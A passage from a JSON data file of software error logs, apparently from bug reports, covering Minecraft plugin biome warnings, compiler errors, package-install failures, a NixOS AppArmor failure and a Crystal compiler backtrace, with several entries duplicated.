thread/WARN]: [Magic]  Invalid biome in biome_actions config: snowy_taiga_mountains\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: wooded_mountains\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: taiga_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: taiga_mountains\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: giant_spruce_taiga\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: giant_spruce_taiga_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: giant_tree_taiga\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: giant_tree_taiga_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: jungle_edge\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: jungle_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: bamboo_jungle_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: modified_jungle_edge\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: wooded_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: dark_forest_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: swamp_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: desert_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: desert_lakes\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: deep_warm_ocean\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: birch_forest_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: tall_birch_forest\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: mountains\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: mountain_edge\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: gravelly_mountains\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: modified_gravelly_mountains\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: stone_shore\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: snowy_tundra\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: snowy_mountains\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: snowy_taiga_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: snowy_taiga_mountains\r\n[Truncated]\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: tall_birch_forest\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: mountains\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: mountain_edge\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: gravelly_mountains\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: modified_gravelly_mountains\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: stone_shore\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: snowy_tundra\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: snowy_mountains\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: snowy_taiga_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: snowy_taiga_mountains\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: wooded_mountains\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: taiga_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: taiga_mountains\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: giant_spruce_taiga\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: giant_spruce_taiga_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: giant_tree_taiga\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: giant_tree_taiga_hills"
    },
    {
        "logs": "[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: jungle_edge\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: jungle_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: bamboo_jungle_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: modified_jungle_edge\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: wooded_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: dark_forest_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: swamp_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: desert_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: desert_lakes\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: deep_warm_ocean\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: birch_forest_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: tall_birch_forest\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: mountains\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: mountain_edge\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: gravelly_mountains\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: modified_gravelly_mountains\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: stone_shore\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: snowy_tundra\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: snowy_mountains\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: snowy_taiga_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: snowy_taiga_mountains\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: wooded_mountains\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: taiga_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: taiga_mountains\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: giant_spruce_taiga\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: giant_spruce_taiga_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: giant_tree_taiga\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: giant_tree_taiga_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: jungle_edge\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: jungle_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: bamboo_jungle_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: modified_jungle_edge\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: wooded_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: dark_forest_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: swamp_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: desert_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: desert_lakes\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: deep_warm_ocean\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: birch_forest_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: tall_birch_forest\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: mountains\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: mountain_edge\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: gravelly_mountains\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: modified_gravelly_mountains\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: stone_shore\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: snowy_tundra\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: snowy_mountains\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: snowy_taiga_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: snowy_taiga_mountains\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: wooded_mountains\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: taiga_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: taiga_mountains\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: giant_spruce_taiga\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: giant_spruce_taiga_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: giant_tree_taiga\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: giant_tree_taiga_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: jungle_edge\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: jungle_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: bamboo_jungle_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: modified_jungle_edge\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: wooded_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: dark_forest_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: swamp_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: desert_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: desert_lakes\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: deep_warm_ocean\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: birch_forest_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: tall_birch_forest\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: mountains\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: mountain_edge\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: gravelly_mountains\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: modified_gravelly_mountains\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: stone_shore\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: snowy_tundra\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: snowy_mountains\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: snowy_taiga_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: snowy_taiga_mountains\r\n[Truncated]\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: tall_birch_forest\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: mountains\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: mountain_edge\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: gravelly_mountains\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: modified_gravelly_mountains\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: stone_shore\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: snowy_tundra\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: snowy_mountains\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: snowy_taiga_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: snowy_taiga_mountains\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: wooded_mountains\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: taiga_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: taiga_mountains\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: giant_spruce_taiga\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: giant_spruce_taiga_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: giant_tree_taiga\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: giant_tree_taiga_hills"
    },
    {
        "logs": "3 | type t = { foo: int } [@@deriving sexp]\r\n                    ^^^\r\nError: This variant pattern is expected to have type none_type\r\n       The constructor Some does not belong to type none_type\r\nHad errors, waiting for filesystem changes..."
    },
    {
        "logs": "3 | type t = { foo: int } [@@deriving sexp]\r\n                    ^^^\r\nError: This variant pattern is expected to have type none_type\r\n       The constructor Some does not belong to type none_type\r\nHad errors, waiting for filesystem changes..."
    },
    {
        "logs": "tiktok-scraper trend -n 6 --filepath /download/tiktok_download/ -t json\r\ninternal/modules/cjs/loader.js:1131\r\n  return process.dlopen(module, path.toNamespacedPath(filename));\r\n                 ^\r\n\r\nError: /lib64/libc.so.6: version `GLIBC_2.18' not found (required by /usr/local/lib/nodejs/lib/node_modules/tiktok-scraper/node_modules/canvas/build/Release/librsvg-2.so.2)\r\n    at Object.Module._extensions..node (internal/modules/cjs/loader.js:1131:18)\r\n    at Module.load (internal/modules/cjs/loader.js:937:32)\r\n    at Function.Module._load (internal/modules/cjs/loader.js:778:12)\r\n    at Module.require (internal/modules/cjs/loader.js:961:19)\r\n    at require (internal/modules/cjs/helpers.js:92:18)\r\n    at Object.<anonymous> (/usr/local/lib/nodejs/lib/node_modules/tiktok-scraper/node_modules/canvas/lib/bindings.js:3:18)\r\n    at Module._compile (internal/modules/cjs/loader.js:1072:14)\r\n    at Object.Module._extensions..js (internal/modules/cjs/loader.js:1101:10)\r\n    at Module.load (internal/modules/cjs/loader.js:937:32)\r\n    at Function.Module._load (internal/modules/cjs/loader.js:778:12)\r\n    at Module.require (internal/modules/cjs/loader.js:961:19)\r\n    at require (internal/modules/cjs/helpers.js:92:18)\r\n    at Object.<anonymous> (/usr/local/lib/nodejs/lib/node_modules/tiktok-scraper/node_modules/canvas/lib/canvas.js:9:18)\r\n    at Module._compile (internal/modules/cjs/loader.js:1072:14)\r\n    at Object.Module._extensions..js (internal/modules/cjs/loader.js:1101:10)\r\n    at Module.load (internal/modules/cjs/loader.js:937:32)\r\n    at Function.Module._load (internal/modules/cjs/loader.js:778:12)\r\n    at Module.require (internal/modules/cjs/loader.js:961:19)\r\n    at require (internal/modules/cjs/helpers.js:92:18)\r\n    at Object.<anonymous> (/usr/local/lib/nodejs/lib/node_modules/tiktok-scraper/node_modules/canvas/index.js:1:16)\r\n    at Module._compile (internal/modules/cjs/loader.js:1072:14)\r\n    at Object.Module._extensions..js (internal/modules/cjs/loader.js:1101:10)"
    },
    {
        "logs": "xz_dep' called for #<DependencyCollector:0x00000001830c38>\nusername_0: ### Bug reports:\r\n\r\nfails to upgrade linux-util\r\n\r\n'brew outdated'"
    },
    {
        "logs": "$ docker --version\r\nDocker version 1.13.0-rc2, build 1f9b3ef\r\n\r\n$ stack --docker image container\r\nRunning /usr/local/bin/docker inspect fpco/stack-build:lts-7.4 exited with ExitFailure 1\r\n\r\n[]\r\n\r\nError: No such object: fpco/stack-build:lts-7.4"
    },
    {
        "logs": "$ docker --version\r\nDocker version 1.13.0-rc2, build 1f9b3ef\r\n\r\n$ stack --docker image container\r\nRunning /usr/local/bin/docker inspect fpco/stack-build:lts-7.4 exited with ExitFailure 1\r\n\r\n[]\r\n\r\nError: No such object: fpco/stack-build:lts-7.4"
    },
    {
        "logs": "  \u25cf Test suite failed to run\r\n\r\n    Cannot find module 'ReactElementType' from 'ReactRef.js'\r\n\r\n      at Resolver.resolveModule (node_modules/jest-resolve/build/index.js:151:17)\r\n      at Object.<anonymous> (node_modules/react-native/Libraries/Renderer/src/renderers/shared/stack/reconciler/ReactRef.js:14:344)\r\n      at Object.<anonymous> (node_modules/react-native/Libraries/Renderer/src/renderers/shared/stack/reconciler/ReactReconciler.js:14:14)"
    },
    {
        "logs": "user@lenovo:/usr/share/elasticsearch$ sudo bin/plugin install file:/home/user/software/elasticsearch-carrot2/target/releases/elasticsearch-carrot2-2.4.3.zip --verbose\r\n-> Installing from file:/home/user/software/elasticsearch-carrot2/target/releases/elasticsearch-carrot2-2.4.3.zip...\r\nTrying file:/home/user/software/elasticsearch-carrot2/target/releases/elasticsearch-carrot2-2.4.3.zip ...\r\nDownloading ..................................................DONE\r\nVerifying file:/home/user/software/elasticsearch-carrot2/target/releases/elasticsearch-carrot2-2.4.3.zip checksums if available ...\r\nNOTE: Unable to verify checksum for downloaded plugin (unable to find .sha1 or .md5 file to verify)\r\n- Plugin information:\r\nName: elasticsearch-carrot2\r\nDescription: Search results clustering plugin for ElasticSearch\r\nSite: true\r\nVersion: 2.4.3\r\nJVM: true\r\n * Classname: org.carrot2.elasticsearch.ClusteringPlugin\r\n * Isolated: true\r\nERROR: Plugin [carrot2] is a site plugin but has no '_site/' directory"
    },
    {
        "logs": "wallet/rpcwallet.cpp: In function \u2018UniValue listunspent(const JSONRPCRequest&)\u2019:\r\nwallet/rpcwallet.cpp:2816:9: warning: variable \u2018nMinDepth\u2019 set but not used [-Wunused-but-set-variable]\r\n     int nMinDepth = 1;\r\n         ^~~~~~~~~"
    },
    {
        "logs": "wallet/rpcwallet.cpp: In function \u2018UniValue listunspent(const JSONRPCRequest&)\u2019:\r\nwallet/rpcwallet.cpp:2816:9: warning: variable \u2018nMinDepth\u2019 set but not used [-Wunused-but-set-variable]\r\n     int nMinDepth = 1;\r\n         ^~~~~~~~~"
    },
    {
        "logs": "$ travis_wait 20 julia --project=docs/ docs/make.jl\r\nStill running (10 of 20): julia --project=docs/ docs/make.jl\r\nThe command julia --project=docs/ docs/make.jl exited with 0.\r\nLog:\r\n[ Info: SetupBuildDirectory: setting up build directory.\r\n[ Info: ExpandTemplates: expanding markdown templates.\r\n\u250c Warning: failed to run "
    },
    {
        "logs": "$ travis_wait 20 julia --project=docs/ docs/make.jl\r\nStill running (10 of 20): julia --project=docs/ docs/make.jl\r\nThe command julia --project=docs/ docs/make.jl exited with 0.\r\nLog:\r\n[ Info: SetupBuildDirectory: setting up build directory.\r\n[ Info: ExpandTemplates: expanding markdown templates.\r\n\u250c Warning: failed to run `@example` block in src/man/reach_zonotopes.md:96-108"
    },
    {
        "logs": "\u279c  ~ sudo nixos-rebuild switch --upgrade             \r\n[sudo] password for william: \r\nunpacking channels...\r\nbuilding Nix...\r\nbuilding the system configuration...\r\nactivating the configuration...\r\nsetting up /etc...\r\nreloading user units for william...\r\nsetting up tmpfiles\r\nthe following new units were started: cpu-throttling.service\r\nwarning: the following units failed: apparmor.service\r\n\r\n\u25cf apparmor.service\r\n   Loaded: loaded (/nix/store/csxmp1iy3f5ijy8m0ajx6ch5n8milljc-unit-apparmor.service/apparmor.service; enabled; vendor preset: enabled)\r\n   Active: failed (Result: exit-code) since Wed 2019-05-08 10:29:31 EDT; 17ms ago\r\n  Process: 2996 ExecStart=/nix/store/5v3ysffjypsndwxkh16byzaa3g55lz4g-apparmor-parser-2.13.1/bin/apparmor_parser -rKv -I /nix/store/gj3zvpgbsnx85nbbrpb5s2kjz4y85w80-apparmor-profiles-2.13.1/etc/apparmor.d -I /nix/store/pmgymay0liaz5xy65z9n029v2qn6k79v-lxc-3.1.0/etc/apparmor.d /nix/store/pmgymay0liaz5xy65z9n029v2qn6k79v-lxc-3.1.0/etc/apparmor.d/usr.bin.lxc-start (code=exited, status=1/FAILURE)\r\n Main PID: 2996 (code=exited, status=1/FAILURE)\r\n\r\nMay 08 10:29:31 helium systemd[1]: Starting apparmor.service...\r\nMay 08 10:29:31 helium apparmor_parser[2996]: Warning from stdin (line 1): config file '/etc/apparmor/parser.conf' not found\r\nMay 08 10:29:31 helium apparmor_parser[2996]: Cache read/write disabled: interface file missing. (Kernel needs AppArmor 2.4 compatibility patch.)\r\nMay 08 10:29:31 helium apparmor_parser[2996]: Warning: unable to find a suitable fs in /proc/mounts, is it mounted?\r\nMay 08 10:29:31 helium apparmor_parser[2996]: Use --subdomainfs to override.\r\nMay 08 10:29:31 helium systemd[1]: apparmor.service: Main process exited, code=exited, status=1/FAILURE\r\nMay 08 10:29:31 helium systemd[1]: apparmor.service: Failed with result 'exit-code'.\r\nMay 08 10:29:31 helium systemd[1]: Failed to start apparmor.service.\r\nwarning: error(s) occurred while switching to the new configuration"
    },
    {
        "logs": "# github.com/jdeng/goheif/libde265\r\nIn file included from libde265-all.inl:37:0,\r\n                 from libde265.cc:2:\r\n../../go/pkg/mod/github.com/jdeng/goheif@v0.0.0-20200323230657-a0d6a8b3e68f/libde265/libde265/slice.cc:2447:0: warning: \"MAX_PREFIX\" redefined\r\n #define MAX_PREFIX 64\r\n\r\nIn file included from libde265-all.inl:13:0,\r\n                 from libde265.cc:2:\r\n../../go/pkg/mod/github.com/jdeng/goheif@v0.0.0-20200323230657-a0d6a8b3e68f/libde265/libde265/cabac.cc:419:0: note: this is the location of the previous definition\r\n #define MAX_PREFIX 32\r\n\r\ncc1plus: warning: unrecognized command line option \u2018-Wno-constant-conversion\u2019"
    },
    {
        "logs": "# github.com/jdeng/goheif/libde265\r\nIn file included from libde265-all.inl:37:0,\r\n                 from libde265.cc:2:\r\n../../go/pkg/mod/github.com/jdeng/goheif@v0.0.0-20200323230657-a0d6a8b3e68f/libde265/libde265/slice.cc:2447:0: warning: \"MAX_PREFIX\" redefined\r\n #define MAX_PREFIX 64\r\n\r\nIn file included from libde265-all.inl:13:0,\r\n                 from libde265.cc:2:\r\n../../go/pkg/mod/github.com/jdeng/goheif@v0.0.0-20200323230657-a0d6a8b3e68f/libde265/libde265/cabac.cc:419:0: note: this is the location of the previous definition\r\n #define MAX_PREFIX 32\r\n\r\ncc1plus: warning: unrecognized command line option \u2018-Wno-constant-conversion\u2019"
    },
    {
        "logs": "node_modules\\react-native-headphone-detection\\android\\src\\main\\java\\com\\tintef\\RNHeadphoneDetection\\RNHeadphoneDetectionModule.java:110: error:\r\n cannot find symbol\r\n          device.getType() == AudioDeviceInfo.TYPE_USB_HEADSET\r\n                                             ^\r\n  symbol:   variable TYPE_USB_HEADSET\r\n  location: class AudioDeviceInfo"
    },
    {
        "logs": "WARNING: channel \"pecl.php.net\" has updated its protocols, use \"pecl channel-update pecl.php.net\" to update\r\ndownloading Mosquitto-0.4.0.tgz ...\r\nStarting to download Mosquitto-0.4.0.tgz (23,804 bytes)\r\n........done: 23,804 bytes\r\n\r\nFatal error: Cannot use result of built-in function in write context in C:\\xampp\\php\\pear\\Archive\\Tar.php on line 639"
    },
    {
        "logs": "WARNING: channel \"pecl.php.net\" has updated its protocols, use \"pecl channel-update pecl.php.net\" to update\r\ndownloading Mosquitto-0.4.0.tgz ...\r\nStarting to download Mosquitto-0.4.0.tgz (23,804 bytes)\r\n........done: 23,804 bytes\r\n\r\nFatal error: Cannot use result of built-in function in write context in C:\\xampp\\php\\pear\\Archive\\Tar.php on line 639"
    },
    {
        "logs": "Last error returned.\r\nUnhandled exception caught: LibHac.HorizonResultException: ResultFsNonRealDataVerificationFailed (2002-4604): Hash error!"
    },
    {
        "logs": "Last error returned.\r\nUnhandled exception caught: LibHac.HorizonResultException: ResultFsNonRealDataVerificationFailed (2002-4604): Hash error!"
    },
    {
        "logs": "Last error returned.\r\nUnhandled exception caught: LibHac.HorizonResultException: ResultFsNonRealDataVerificationFailed (2002-4604): Hash error!"
    },
    {
        "logs": "Last error returned.\r\nUnhandled exception caught: LibHac.HorizonResultException: ResultFsNonRealDataVerificationFailed (2002-4604): Hash error!"
    },
    {
        "logs": "info: Duende.IdentityServer.Events.DefaultEventService[0]\r\n      {\r\n        \"ClientId\": \"wasm.Client\",\r\n        \"Endpoint\": \"Authorize\",\r\n        \"Scopes\": \"\",\r\n        \"Error\": \"unauthorized_client\",\r\n        \"ErrorDescription\": \"Unknown client or client not enabled\",\r\n        \"Category\": \"Token\",\r\n        \"Name\": \"Token Issued Failure\",\r\n        \"EventType\": \"Failure\",\r\n        \"Id\": 2001,\r\n        \"ActivityId\": \"0HMBT678IK5QL:00000003\",\r\n        \"TimeStamp\": \"2021-09-21T18:58:37Z\",\r\n        \"ProcessId\": 22268,\r\n        \"LocalIpAddress\": \"::1:5001\",\r\n        \"RemoteIpAddress\": \"::1\"\r\n      }"
    },
    {
        "logs": " still crashed a fresh R session not in a project. I then found this post, and closing the spreadsheet in Excel solved the problem. My session info is below:"
    },
    {
        "logs": "In file included from src/lxml/lxml.etree.c:320:0:\r\n    src/lxml/includes/etree_defs.h:14:31: fatal error: libxml/xmlversion.h: Aucun fichier ou dossier de ce type\r\n    compilation terminated."
    },
    {
        "logs": "In file included from src/lxml/lxml.etree.c:320:0:\r\n    src/lxml/includes/etree_defs.h:14:31: fatal error: libxml/xmlversion.h: Aucun fichier ou dossier de ce type\r\n    compilation terminated."
    },
    {
        "logs": "NoMethodError: undefined method `[]' for nil:NilClass\r\nfrom ..path_here/gems/faraday-0.9.2/lib/faraday/utils.rb:48:in `[]='"
    },
    {
        "logs": "Bug: trying to upcast Other <- Child\r\n[4330870267] *raise<String>:NoReturn +155\r\n[4334986607] *Crystal::CodeGenVisitor#upcast<Crystal::CodeGenVisitor, LLVM::Value, Crystal::Type+, Crystal::Type+>:LLVM::Value +12431\r\n[4335047424] *Crystal::CodeGenVisitor#codegen_primitive<Crystal::CodeGenVisitor, Crystal::Primitive+, Crystal::Def+, Array(LLVM::Value)>:LLVM::Value +1008\r\n[4335021614] *Crystal::CodeGenVisitor#visit<Crystal::CodeGenVisitor, Crystal::Call>:Bool +910\r\n[4334909612] *Crystal::ASTNode+@Crystal::ASTNode#accept<Crystal::ASTNode+, Crystal::CodeGenVisitor>:Nil +1452\r\n[4334969124] *Crystal::CodeGenVisitor#codegen_fun<Crystal::CodeGenVisitor, String, Crystal::Def+, Crystal::Type+, Bool, LLVM::Module, Bool, Bool>:LLVM::Function +3732\r\n[4334990843] *Crystal::CodeGenVisitor#target_def_fun<Crystal::CodeGenVisitor, Crystal::Def+, Crystal::Type+>:LLVM::Function +2891\r\n[4335024199] *Crystal::CodeGenVisitor#visit<Crystal::CodeGenVisitor, Crystal::Call>:Bool +3495\r\n[4334909612] *Crystal::ASTNode+@Crystal::ASTNode#accept<Crystal::ASTNode+, Crystal::CodeGenVisitor>:Nil +1452\r\n[4334910950] *Crystal::ASTNode+@Crystal::ASTNode#accept<Crystal::ASTNode+, Crystal::CodeGenVisitor>:Nil +2790\r\n[4334969124] *Crystal::CodeGenVisitor#codegen_fun<Crystal::CodeGenVisitor, String, Crystal::Def+, Crystal::Type+, Bool, LLVM::Module, Bool, Bool>:LLVM::Function +3732\r\n[4334990843] *Crystal::CodeGenVisitor#target_def_fun<Crystal::CodeGenVisitor, Crystal::Def+, Crystal::Type+>:LLVM::Function +2891\r\n[4335024199] *Crystal::CodeGenVisitor#visit<Crystal::CodeGenVisitor, Crystal::Call>:Bool +3495\r\n[4334909612] *Crystal::ASTNode+@Crystal::ASTNode#accept<Crystal::ASTNode+, Crystal::CodeGenVisitor>:Nil +1452\r\n[4334910950] *Crystal::ASTNode+@Crystal::ASTNode#accept<Crystal::ASTNode+, Crystal::CodeGenVisitor>:Nil +2790\r\n[4334969124] *Crystal::CodeGenVisitor#codegen_fun<Crystal::CodeGenVisitor, String, Crystal::Def+, Crystal::Type+, Bool, LLVM::Module, Bool, Bool>:LLVM::Function +3732\r\n[4334990843] *Crystal::CodeGenVisitor#target_def_fun<Crystal::CodeGenVisitor, Crystal::Def+, Crystal::Type+>:LLVM::Function +2891\r\n[4335024199] *Crystal::CodeGenVisitor#visit<Crystal::CodeGenVisitor, Crystal::Call>:Bool +3495\r\n[4334909612] *Crystal::ASTNode+@Crystal::ASTNode#accept<Crystal::ASTNode+, Crystal::CodeGenVisitor>:Nil +1452\r\n[4334709069] *Crystal::Compiler#codegen<Crystal::Compiler, Crystal::Program, Crystal::Expressions, Array(Crystal::Compiler::Source), String>:Nil +2861\r\n[4333456579] *Crystal::Compiler#compile<Crystal::Compiler, Array(Crystal::Compiler::Source), String>:Crystal::Compiler::Result +9555\r\n[4338246353] 